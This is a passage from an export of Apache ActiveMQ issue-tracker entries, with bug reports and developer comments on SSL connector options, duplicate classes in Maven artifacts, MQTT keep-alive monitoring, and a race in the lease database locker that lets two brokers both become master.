Add XA support to the LevelDB store.,AMQ-4134,12613368,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,24/Oct/12 21:07,28/Jan/13 15:37,14/Jul/23 05:43,28/Jan/13 15:37,,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,250866,,,Mon Jan 28 15:37:05 UTC 2013,,,,,,,,,,,"0|i0b23z:",62454,,,,,,,,,,,,,,,,,,,,,"28/Jan/13 15:32;tabish;This one done as well for v5.8.0 ?;;;","28/Jan/13 15:37;chirino;Yep. implemented.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Different behaviour with similar connectors with identical option, URI validation would be nice to have",AMQ-4133,12613301,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,mpaladin,mpaladin,24/Oct/12 17:14,25/Oct/12 23:18,14/Jul/23 05:43,25/Oct/12 23:18,5.7.0,,,,,5.8.0,,,Transport,,,,0,,,,,,,,,"Hello,

we noticed an inconsistent behaviour of stomp+ssl and stomp+nio+ssl with same connector options.

- stomp+ssl works with both {{transport.needClientAuth=true}} and {{needClientAuth=true}} options
- stomp+nio+ssl works with {{transport.needClientAuth=true}} but not with {{needClientAuth=true}}
In this last case it fails with a non-obvious exception:
{noformat}
junit.framework.ComparisonFailure: java.lang.SecurityException: Unable to authenticate transport without SSL certificate.
        at org.apache.activemq.security.JaasCertificateAuthenticationBroker.addConnection(JaasCertificateAuthenticationBroker.java:74)
        at org.apache.activemq.security.JaasDualAuthenticationBroker.addConnection(JaasDualAuthenticationBroker.java:98)
{noformat}

It would be nice to have a URI parameters validation or the same behaviour with similar connectors.

What do you think?

Unit test which shows the problem attached, sorry for reusing pieces from another bug.",,lionel.cons,mpaladin,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Oct/12 17:16;mpaladin;AMQ4133.tgz;https://issues.apache.org/jira/secure/attachment/12550650/AMQ4133.tgz",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,250791,,,Thu Oct 25 23:18:20 UTC 2012,,,,,,,,,,,"0|i0b1i7:",62356,,,,,,,,,,,,,,,,,,,,,"25/Oct/12 06:19;lionel.cons;ActiveMQ already performs strict XML validation to detect incorrect configuration items before starting the broker, this is very good.

It should IMHO also strictly validate the options given via the URI syntax and that therefore escape standard schema based validation.;;;","25/Oct/12 23:18;tabish;Fixed on trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Openwire+nio+ssl require to specify transport.enabledCipherSuites property,AMQ-4132,12613296,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mpaladin,mpaladin,24/Oct/12 16:19,25/Oct/12 20:17,14/Jul/23 05:43,25/Oct/12 20:17,5.7.0,,,,,5.8.0,,,Transport,,,,0,,,,,,,,,"Hello,

trying the openwire+nio+ssl connector I noticed that it requires to declare the {{transport.enabledCipherSuites}} connector property or it results in an EOF exception. Is this intended?
It is not the case with the other ssl connectors.

Unit test attached.",,lionel.cons,mpaladin,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Oct/12 16:20;mpaladin;NIOSSLBasicTest.java;https://issues.apache.org/jira/secure/attachment/12550646/NIOSSLBasicTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,250786,,,Thu Oct 25 20:17:02 UTC 2012,,,,,,,,,,,"0|i0b1gf:",62348,,,,,,,,,,,,,,,,,,,,,"24/Oct/12 21:57;tabish;Seems to be related to what cipher suite is chosen, you can reproduce it by setting the wrong one in the enabledCipherSuite option as well, the default case just shows it right away. ;;;","25/Oct/12 20:17;tabish;Fixed now on trunk.  The cipher suite in play can result in the packets containing the openwire commands to be broken up and the transport wasn't able to properly reassemble them.  Its now able to deal with this, tested several different ciphers and it seems to work fine with them all. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Duplicated classes in activemq-core and activemq-protobuf artifacts,AMQ-4131,12613211,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jstarker,jstarker,23/Oct/12 22:29,16/Jan/13 21:25,14/Jul/23 05:43,16/Jan/13 21:25,5.7.0,,,,,5.8.0,,,,,,,0,,,,,,,,,"When adding activemq-core as a dependency in a java maven project, the activemq-core pulls in a dependency for activemq-protobuf. However, the activemq-core artifact duplicates all of the classes located in the activemq-protobuf.

Doing a diff between the two jars for activemq-spring-5.7.0.jar and activemq-protobuf-1.1.jar, the following classes are duplicated:

{noformat}
[WARNING] Found duplicate classes in [org.apache.activemq:activemq-core:5.7.0,org.apache.activemq.protobuf:activemq-protobuf:1.1] :
[WARNING]   org.apache.activemq.protobuf.AsciiBuffer
[WARNING]   org.apache.activemq.protobuf.BaseMessage
[WARNING]   org.apache.activemq.protobuf.Buffer
[WARNING]   org.apache.activemq.protobuf.BufferInputStream
[WARNING]   org.apache.activemq.protobuf.BufferOutputStream
[WARNING]   org.apache.activemq.protobuf.CodedInputStream
[WARNING]   org.apache.activemq.protobuf.CodedOutputStream
[WARNING]   org.apache.activemq.protobuf.DeferredDecodeMessage
[WARNING]   org.apache.activemq.protobuf.InvalidProtocolBufferException
[WARNING]   org.apache.activemq.protobuf.Message
[WARNING]   org.apache.activemq.protobuf.MessageBuffer
[WARNING]   org.apache.activemq.protobuf.MessageBufferSupport
[WARNING]   org.apache.activemq.protobuf.PBMessage
[WARNING]   org.apache.activemq.protobuf.UTF8Buffer
[WARNING]   org.apache.activemq.protobuf.UninitializedMessageException
[WARNING]   org.apache.activemq.protobuf.WireFormat
[WARNING]   org.apache.activemq.protobuf.compiler.AltJavaGenerator
[WARNING]   org.apache.activemq.protobuf.compiler.CommandLineSupport
[WARNING]   org.apache.activemq.protobuf.compiler.CompilerException
[WARNING]   org.apache.activemq.protobuf.compiler.EnumDescriptor
[WARNING]   org.apache.activemq.protobuf.compiler.EnumFieldDescriptor
[WARNING]   org.apache.activemq.protobuf.compiler.ExtensionsDescriptor
[WARNING]   org.apache.activemq.protobuf.compiler.FieldDescriptor
[WARNING]   org.apache.activemq.protobuf.compiler.IntrospectionSupport
[WARNING]   org.apache.activemq.protobuf.compiler.JavaGenerator
[WARNING]   org.apache.activemq.protobuf.compiler.MessageDescriptor
[WARNING]   org.apache.activemq.protobuf.compiler.MethodDescriptor
[WARNING]   org.apache.activemq.protobuf.compiler.OptionDescriptor
[WARNING]   org.apache.activemq.protobuf.compiler.ParserSupport
[WARNING]   org.apache.activemq.protobuf.compiler.ProtoDescriptor
[WARNING]   org.apache.activemq.protobuf.compiler.ProtoMojo
[WARNING]   org.apache.activemq.protobuf.compiler.ServiceDescriptor
[WARNING]   org.apache.activemq.protobuf.compiler.TextFormat
[WARNING]   org.apache.activemq.protobuf.compiler.TypeDescriptor
[WARNING]   org.apache.activemq.protobuf.compiler.parser.ParseException
[WARNING]   org.apache.activemq.protobuf.compiler.parser.ProtoParser
[WARNING]   org.apache.activemq.protobuf.compiler.parser.ProtoParserConstants
[WARNING]   org.apache.activemq.protobuf.compiler.parser.ProtoParserTokenManager
[WARNING]   org.apache.activemq.protobuf.compiler.parser.SimpleCharStream
[WARNING]   org.apache.activemq.protobuf.compiler.parser.Token
[WARNING]   org.apache.activemq.protobuf.compiler.parser.TokenMgrError
{noformat}

activemq-core is currently packaged incorrectly because of this. This will cause classloader issues as these classes are duplicated. However, luckily the classes are identical, but if something changes down the road it could cause unexpected behavior.

Current workaround:

{code:xml}
<dependency>
	<groupId>org.apache.activemq</groupId>
	<artifactId>activemq-core</artifactId>
	<version>5.7.0</version>
	<exclusions>
		<exclusion>
			<artifactId>activemq-protobuf</artifactId>
		 	<groupId>org.apache.activemq.protobuf</groupId>
		</exclusion>
	</exclusions>
</dependency>
{code}

Suggested fix is to remove the duplicated classes from activemq-core and instead bring them in through the activemq-protobuf dependency.
",Maven,jstarker,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,250649,,,Wed Jan 16 21:25:02 UTC 2013,,,,,,,,,,,"0|i0azw7:",62093,,,,,,,,,,,,,,,,,,,,,"30/Nov/12 16:28;tabish;Not sure what you have going on but there's no code overlap here.;;;","30/Nov/12 17:45;jstarker;Hello, not to be a pain, but I think there is a duplication. Here are more steps to show you what I am talking about. Sorry for being unclear before.
Steps:
# Download the activemq-core-5.7.0.jar and activemq-protobuf-1.1.jar via Maven. Using the central maven repository. You can also find them via the web at: http://search.maven.org/remotecontent?filepath=org/apache/activemq/activemq-core/5.7.0/activemq-core-5.7.0.jar and http://search.maven.org/remotecontent?filepath=org/apache/activemq/protobuf/activemq-protobuf/1.1/activemq-protobuf-1.1.jar respectively.
# Expand the jar files in to a directory:
{noformat}
jar -xvf activemq-core-5.7.0.jar
jar -xvf activemq-protobuf-1.1.jar
{noformat}
You will notice that the org.apache.activemq.protobuf package is also included in activemq-core-5.7.0.jar file when expanded.
# After extracting the two jar files, you can do a diff on any file I listed above in the previous comment to show they are identical:
{code}
diff ${directory_of_core_jar_extract}/org/apache/activemq/protobuf/PBMessage.class ${directory_of_protobuf_jar_extract}/org/apache/activemq/protobuf/PBMessage.class
{code};;;","16/Jan/13 21:25;tabish;v5.8 has module refactoring, and should fix any issue you might think exists here. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Duplicated Classes in activemq-spring and activemq-pool artifacts,AMQ-4130,12613208,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jstarker,jstarker,23/Oct/12 22:10,17/Jan/13 18:49,14/Jul/23 05:43,17/Jan/13 18:49,5.7.0,,,,,5.8.0,,,Pool,,,,0,,,,,,,,,"When adding activemq-spring as a dependency in a java maven projects, the activemq-spring includes the artifact activemq-pool as a dependency. However, this causes a problem as activemq-spring duplicates many of the classes that are in activemq-pool.

If you do a directory and file comparision between activemq-spring-5.7.0.jar and activemq-pool-5.7.0.jar, the following files are duplicated in activemq-spring:

{noformat}
[WARNING] Found duplicate classes in [org.apache.activemq:activemq-pool:5.7.0,org.apache.activemq:activemq-spring:5.7.0] :
[WARNING]   org.apache.activemq.pool.ActiveMQResourceManager
[WARNING]   org.apache.activemq.pool.AmqJNDIPooledConnectionFactory
[WARNING]   org.apache.activemq.pool.ConnectionKey
[WARNING]   org.apache.activemq.pool.ConnectionPool
[WARNING]   org.apache.activemq.pool.JcaConnectionPool
[WARNING]   org.apache.activemq.pool.JcaPooledConnectionFactory
[WARNING]   org.apache.activemq.pool.PooledConnection
[WARNING]   org.apache.activemq.pool.PooledConnectionFactory
[WARNING]   org.apache.activemq.pool.PooledMessageConsumer
[WARNING]   org.apache.activemq.pool.PooledProducer
[WARNING]   org.apache.activemq.pool.PooledQueueSender
[WARNING]   org.apache.activemq.pool.PooledSession
[WARNING]   org.apache.activemq.pool.PooledSessionEventListener
[WARNING]   org.apache.activemq.pool.PooledTopicPublisher
[WARNING]   org.apache.activemq.pool.SessionKey
[WARNING]   org.apache.activemq.pool.XaConnectionPool
[WARNING]   org.apache.activemq.pool.XaPooledConnectionFactory
{noformat}

This can cause classloader problems as there are duplicated classes located on the path if activemq-pool or activemq-spring classes changed in a later version. This problem has also happened in previous versions of activemq.

Current workaround is to simply add exclusion to activemq-pool:

{code:xml}
<dependency>
	<groupId>org.apache.activemq</groupId>
	<artifactId>activemq-spring</artifactId>
	<version>5.7.0</version>
	<exclusions>
		<exclusion>
			<artifactId>activemq-pool</artifactId>
			<groupId>org.apache.activemq</groupId>
		</exclusion>
	</exclusions>
</dependency>
{code}

Suggested fix is to remove the classes from activemq-spring package and instead include the classes located in activemq-pool as a required dependency.
",Maven integration,jstarker,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,250645,,,Fri Nov 30 17:37:11 UTC 2012,,,,,,,,,,,"0|i0azvb:",62089,,,,,,,,,,,,,,,,,,,,,"30/Nov/12 16:28;tabish;Not sure what you have going on here, there's no duplication here in these modules. ;;;","30/Nov/12 17:37;jstarker;Hello, not to be a pain, but I think there is a duplication. Here are more steps to show you what I am talking about. Sorry for being unclear before.

Steps:

# Download the activemq-pool-5.7.0.jar and activemq-spring-5.7.0.jar via Maven. Using the central maven repository. You can also find them via the web at: http://search.maven.org/remotecontent?filepath=org/apache/activemq/activemq-pool/5.7.0/activemq-pool-5.7.0.jar and http://search.maven.org/remotecontent?filepath=org/apache/activemq/activemq-spring/5.7.0/activemq-spring-5.7.0.jar respectively.
# Expand the jar files in to a directory:
{noformat}
jar -xvf activemq-spring-5.7.0.jar
jar -xvf activemq-pool-5.7.0.jar
{noformat}
# You will notice that the org.apache.activemq.pool package is also included in activemq-spring-5.7.0.jar file when expanded.
# After extracting the two jar files, you can do a diff on any file I listed above in the previous comment to show they are identical:
{code}
diff ${directory_of_pool_jar_extract}/org/apache/activemq/pool/ActiveMQResourceManager.class ${directory_of_spring_jar_extract}/org/apache/activemq/pool/ActiveMQResourceManager.class 
{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
stomp+nio+ssl + jaasDualAuthenticationPlugin + certificate authentication fails,AMQ-4126,12613154,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mpaladin,mpaladin,23/Oct/12 15:15,07/Dec/15 17:18,14/Jul/23 05:43,23/Oct/12 23:07,5.7.0,,,,,5.8.0,,,STOMP,Transport,,,0,,,,,,,,,"Hello,

ActiveMQ's trunk currently fails for the current use case:
- server: stomp+nio+ssl connector + jaasDualAuthenticationPlugin
- client: connecting to the server and expecting private certificate authentication

Unit test reproducing the problem provided.

{noformat}
2012-10-23 17:13:01,207 [MQ NIO Worker 4] - WARN  ProtocolConverter              - Exception occurred processing: 
CONNECT


^@: java.lang.SecurityException: User name [null] or password is invalid.

2012-10-23 17:13:01,210 [MQ NIO Worker 4] - WARN  Transport                      - Transport Connection to: tcp://128.141.156.34:59500 failed: java.io.IOException: User name [null] or password is invalid.
{noformat}
",,lionel.cons,mpaladin,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-6074,,,,,,,,,,,,,,,,"23/Oct/12 15:18;mpaladin;AMQ4126.tgz;https://issues.apache.org/jira/secure/attachment/12550475/AMQ4126.tgz",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,250585,,,Tue Oct 23 23:07:41 UTC 2012,,,,,,,,,,,"0|i0azgv:",62024,,,,,,,,,,,,,,,,,,,,,"23/Oct/12 20:54;tabish;Great test case, really helpful in narrowing down the various issues.  Thanks!;;;","23/Oct/12 23:07;tabish;Fixed now in trunk, test cases added so this should stay fixed now. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve MQTT Inactivity Monitoring,AMQ-4123,12613057,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,ceposta,ceposta,ceposta,22/Oct/12 21:59,30/Oct/12 12:15,14/Jul/23 05:43,29/Oct/12 20:58,5.7.0,,,,,5.8.0,,,MQTT,Transport,,,1,,,,,,,,,"* Keep Alive should be 1.5 * the keep alive value specified by client (the grace period described in spec: http://public.dhe.ibm.com/software/dw/webservices/ws-mqtt/mqtt-v3r1.html)

* MQTTInactivityMonitor checking for KeepAliveInfo in the onCommand, but it can never get a KeepAliveInfo as it is

* What to do when user explicitly turns Inactivity Monitor off?

* Should there be defaults to close potentially dead connections?",,ceposta,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,250454,,,Mon Oct 29 20:57:42 UTC 2012,,,,,,,,,,,"0|i0aymn:",61883,,,,,,,,,,,,,,,,,,,,,"23/Oct/12 19:20;tabish;The MQTTInactivityMonitor doesn't really need to get an KeepAliveInfo so long as the receiveCounter value is updated correctly.  I committed a fix today that should make that happen now in the NIO and NIOSSL transports so all should be fine there.  ;;;","23/Oct/12 19:24;ceposta;Tim,
I considered that too. However, the PINGREQ/PINGRESP are frames that are part of the contract/spec that determine whether a connection should stay open (insofar as I understand). So if the PINGREQ frame isn't treated specifically in the InactivityMonitor, then it's only counting whether or not more data has come in over the wire. But in that case, you could just send in random data not related to the MQTT spec and that alone would keep the InactivityMonitor alive... Which isn't necessarily desired? ;;;","23/Oct/12 19:42;tabish;Well technically speaking you could do that on any of the transports, but hopefully that random data would generate a marshaling exception and shutdown the connection.  ;;;","23/Oct/12 19:43;tabish;I'm not opposed to you adding in the conversion to a KeepAliveInfo, just wanted to note that its not altogether necessary. ;;;","23/Oct/12 20:07;ceposta;Yah, I hear ya. Im on the fence now too. If we use the KeepAliveInfo, then it ties the PINGREQ/RESP to the InactivityMonitor. As it is right now, when the MQTTProtocolConverter sees a PINGREQ, it responds right away with a PINGRESP regardless of whether there is an InactivityMonitor (transport.useInactivityMonitor=false). 

On the other hand, the InactivityMonitor is the heart-beating on the server side and the PINGREQ/RESP is the contract. My instincts say to make the PINGREQ/RESP explicit in the implementation. 

idk yet. i'll run my proposed changes by you before I commit.;;;","23/Oct/12 22:55;ceposta;So I went without the KeepAliveInfo object. 

Also fixed the MQTTTests that were broken, added more around inactivity monitor, added default keep-alive for server side, implemented a grace-period for keep-alive.

Tim, if you could review just to sanity check, that would be great.

The tests around inactivity monitor are not the best (uses some Thread.sleep() calls to get the inactivity monitor to hang). If you can think of a better way, I'm all ears.;;;","23/Oct/12 22:57;ceposta;PS... there are some docs I would like to update on the wiki around MQTT. I still don't seem to have access to assign things to myself in jira, and I don't see any options to update the wiki. Is that another permission?;;;","23/Oct/12 23:00;tabish;There's some karma needed to edit the Wiki.;;;","23/Oct/12 23:12;tabish;Changes look good, not sure on the tests, will have to think on that. ;;;","24/Oct/12 13:15;tabish;Updated the test case to remove the hard sleeps;;;","24/Oct/12 13:18;ceposta;Ah, very nice with the waitFor(condition)... thanks!;;;","29/Oct/12 20:52;tabish;@Christian, is this complete now?  ;;;","29/Oct/12 20:57;ceposta;Tim,
Yes. Was waiting to assign it to myself, but haven't heard back from Hiram on my Jira access. I can mark it resolved;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Lease Database Locker failover broken,AMQ-4122,12612994,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,st.h,st.h,22/Oct/12 16:07,06/Mar/14 09:05,14/Jul/23 05:43,09/Nov/12 20:16,5.7.0,,,,,5.8.0,,,,,,,3,,,,,,,,,"We are using ActiveMQ 5.7.0 together with a mysql database and could not observe correct failover behavior with lease database locker.
It seems that there is a race condition, which prevents the correct failover procedure.
We noticed that when starting up two instances, both instance are becoming master.

We did several test, including the following and could not observe intended functionality:
- shutdown all instances
- manipulate database lock that one node has lock and set expiry time in distance future
- start up both instances. both instances are unable to acquire lock, as the lock hasn't expired, which should be correct behavior.
- update the expiry time in database, so that the lock is expired.
- first instance notices expired lock and becomes master
- when second instance checks for lock, it also updates the database and becomes master.

To my understanding the second instance should not be able to update the lock, as it is held by the first instance and should not be able to become master.","Java 7u9, SUSE 11, Mysql",fieldju,gtully,jgaudet,metatech,millkyl,seyffchr,st.h,wangyin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4108,,,,,,,,,,,,,,,,"21/Feb/13 09:34;wangyin;AMQ4122.patch;https://issues.apache.org/jira/secure/attachment/12570282/AMQ4122.patch","08/Nov/12 17:45;millkyl;activemq-kyle.xml;https://issues.apache.org/jira/secure/attachment/12552677/activemq-kyle.xml","26/Oct/12 21:15;fieldju;activemq.xml;https://issues.apache.org/jira/secure/attachment/12551023/activemq.xml","24/Oct/12 14:14;seyffchr;activemq.xml;https://issues.apache.org/jira/secure/attachment/12550630/activemq.xml","06/Mar/14 09:05;metatech;amq_dual_master_5.7_backport.patch;https://issues.apache.org/jira/secure/attachment/12633081/amq_dual_master_5.7_backport.patch","21/Feb/13 16:23;st.h;mysql.log;https://issues.apache.org/jira/secure/attachment/12570319/mysql.log",,,,,,,,,,,,,,,,6.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,250366,,,Thu Mar 06 09:05:35 UTC 2014,,,,,,,,,,,"0|i0axx3:",61768,,,,,,,,,,,,,,,,,,,,,"23/Oct/12 13:21;gtully;are the broker names unique for master and slave. If not, then you need to provide unique names to the locker via setLeaseHolderId in xml config.

If possible, could you try and make a variant of org.apache.activemq.store.jdbc.LeaseDatabaseLockerTest (from activemq-core) that demonstrates the problem you are seeing.
That test uses an embedded derby instance, but you can fire off sql to that instance to simulate whatever changes you want.;;;","24/Oct/12 14:14;seyffchr;Hi Gary, I attached our current activemq.xml which was active on two nodes (master/slave). As you can see the broker attribute useLocalHostBrokerName is set to true. The broker registers with its unique hostname.;;;","24/Oct/12 20:06;gtully;thanks for the config Christoph, I went ahead and built a simple unit test based on your description. It works fine. Maybe I need to add more contention, ie: more locks to try and replicate a race condition. The locker currently verifies that it succeeded in acquiring the lock by doing a lease extend immediately after, so it should be safe but there may be need for a random pause in there.
Can you peek at the test case and see if it reflects your use case and is possible modify it such that it breaks?
http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/test/java/org/apache/activemq/store/jdbc/LeaseDatabaseLockerTest.java?view=diff&r1=1401848&r2=1401849&pathrev=1401849;;;","26/Oct/12 21:09;fieldju;I can also confirm that I am having the same issue.

I have to brokers running on 2 different machines and when I kill the mysql DB, 
and it comes back online both brokers both become the master.

I also attached my activeMQ config
and here is a screen shot of the log
http://i.imgur.com/ZS4Er.jpg;;;","26/Oct/12 22:30;fieldju;looks like I was using the depreciated setDatabaseLocker when i should have been using setLocker.
;;;","08/Nov/12 17:35;millkyl;We are seeing a similar issue.  After debugging, I've found some odd behavior. 

When the LockableServiceSupport class gets a ""false"" back from the LeaseDatabaseBaseLocker.keepAlive() method, it calls LockableServiceSupport.stopBroker().

On line 132 of LockableServiceSupport:

LOG.info(brokerService.getBrokerName() + "", no longer able to keep the exclusive lock so giving up being a master"");

This fails for me with a NullPointerException, which kills the thread, but does not stop the broker.

It turns out, there is an org.apache.activemq.broker.BrokerService variable (brokerService) that is null.  However, there is also a org.apache.activemq.xbean.XBeanBrokerService variable (brokerService) that is not null.  This is odd.

I'm guessing that I have a problem with my configuration.  I will be posting mine as well.;;;","08/Nov/12 17:41;fieldju;I was never able to resolve the issue so i made the following work around
I basically have each broker query the db to get who the current Master should be (based of the brokers hostname)
compare it to its host name and check the isSlave value. if there is a discrepancy I shut the broker down and create a new one.

ActiveMQ Broker Monitor
https://gist.github.com/4040309

ActiveMQ bean definitions / configuration
https://gist.github.com/4040646

Parallel Ingestion ActiveMQ Manager
https://gist.github.com/4fc5669d41f25072d2f4

Broker Factory (see bean definition in ActiveMQ bean definitions)
https://gist.github.com/8ad9cf6ace9245c63f41;;;","08/Nov/12 21:54;millkyl;I looked at things a bit closer and realized that there is a bug that is contributing to this behavior.

org.apache.activemq.broker.LockableServiceSupport has a private BrokerService variable.  It implements BrokerServiceAware and has a method setBrokerService(...).

org.apache.activemq.store.jdbc.JDBCPersistenceAdapter (which extends from LockableServiceSupport) ALSO has a private BrokerService variable.  It ALSO implements BrokerServiceAware and has a method setBrokerService(...).  Because it extends from LockableServiceSupport, it overrides the setter and consequently, the private BrokerService variable will NEVER be set.

I think that the JDBCPersistenceAdapter class should get rid of its private BrokerService variable (and setter).  This will solve the issue that I was seeing with 2 active master brokers.;;;","09/Nov/12 15:46;gtully;the duplicate hiding brokerService variable in JDBCPersistenceAdapter was resolved by https://issues.apache.org/jira/browse/AMQ-4108 but there is still the need to tidy up the inheritance structure.;;;","09/Nov/12 15:48;gtully;hidden brokerService var removed as part of the fix for AMQ-4108;;;","09/Nov/12 20:16;gtully;Closing this off, did the final bit of tidy up in: http://svn.apache.org/viewvc?rev=1407614&view=rev

It would be great if you could validate a 5.8-SNAPSHOT at some stage.;;;","20/Feb/13 14:23;st.h;I did some first tests with the 5.8 Release version. The lease database locker seems to work as expected now. However, it seems that it is always the last node that is available that becomes master. 
For instance:
start node1 -> node1 is master
start node2 -> node1 gives up being master; node2 becomes master
stop node1 -> node2 stays master
start node1 -> node2 gives up being master; node1 becomes master
While I am not sure if this is the intended behavior, right now I do not expect any issues with that.;;;","20/Feb/13 20:43;gtully;@st.h - that is not expected unless all of the brokers have the same name. I would be great to see a sql log of the db for the lock table as the nodes attempt to get the lock;;;","20/Feb/13 21:06;st.h;I have configured ActiveMQ to use the hostnames. The master correctly shows up with its hostname in the DB, so that should be good. Is it possible to configure ActiveMQ to log the sql statements, or do you need the DBs log? The latter one might be a problem here.;;;","20/Feb/13 21:55;gtully;@st.h was thinking the latter. Or maybe there is a logging sql driver or wrapper. The broker does not provide this, well not the data in prepared statements which is the interesting part. For that reason, the logs from the DB is best. And the DB is common to all brokers so it should provide the interesting overlap etc.;;;","21/Feb/13 08:41;wangyin;I also see the same unexpected behavior experienced by st.h.
New broker starts up will obtain the lease lock successfully every time and no slaves can keep standing.
